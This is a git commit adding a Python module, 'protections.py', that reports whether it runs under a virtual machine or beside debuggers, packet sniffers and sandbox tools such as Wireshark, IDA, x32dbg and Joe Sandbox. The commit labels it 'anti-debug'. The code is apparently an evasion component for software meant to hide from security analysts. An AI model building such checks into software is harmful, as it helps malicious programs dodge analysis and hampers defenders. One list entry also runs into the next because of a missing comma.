e7e67cb5224ccc10fdb3be2cb41ff627acc6bc58
JuicyChann <nik.xeiladakis@gmail.com>
2023-07-29 18:00:44 +0300

    add more processes (anti-debug)

---
+++ resources/protections.py
@@ -0,0 +1,51 @@
+import psutil
+import os
+
+def is_running_in_vm():
+    vm_files = [
+        "C:\\windows\\system32\\vmGuestLib.dll",
+        "C:\\windows\\system32\\vm3dgl.dll",
+        "C:\\windows\\system32\\vboxhook.dll",
+        "C:\\windows\\system32\\vboxmrxnp.dll",
+        "C:\\windows\\system32\\vmsrvc.dll",
+        "C:\\windows\\system32\\drivers\\vmsrvc.sys"
+    ]
+    vm_processes = [ # these are vmware but might add other ones later if I find any
+        'vmtoolsd.exe', 
+        'vmwaretray.exe', 
+        'vmwareuser.exe'
+        'fakenet.exe', 
+        'dumpcap.exe', 
+        'httpdebuggerui.exe', 
+        'wireshark.exe', 
+        'fiddler.exe', 
+        'vboxservice.exe', 
+        'df5serv.exe', 
+        'vboxtray.exe', 
+        'vmwaretray.exe', 
+        'ida64.exe', 
+        'ollydbg.exe', 
+        'pestudio.exe', 
+        'vgauthservice.exe', 
+        'vmacthlp.exe', 
+        'x96dbg.exe', 
+        'x32dbg.exe', 
+        'prl_cc.exe', 
+        'prl_tools.exe', 
+        'xenservice.exe', 
+        'qemu-ga.exe', 
+        'joeboxcontrol.exe', 
+        'ksdumperclient.exe', 
+        'ksdumper.exe', 
+        'joeboxserver.exe', 
+    ]
+
+    for process in psutil.process_iter(['pid', 'name']):
+        if process.info['name'].lower() in vm_processes:
+            return True
+    for file_path in vm_files:
+        if os.path.exists(file_path):
+            return True
+
+
+    return False
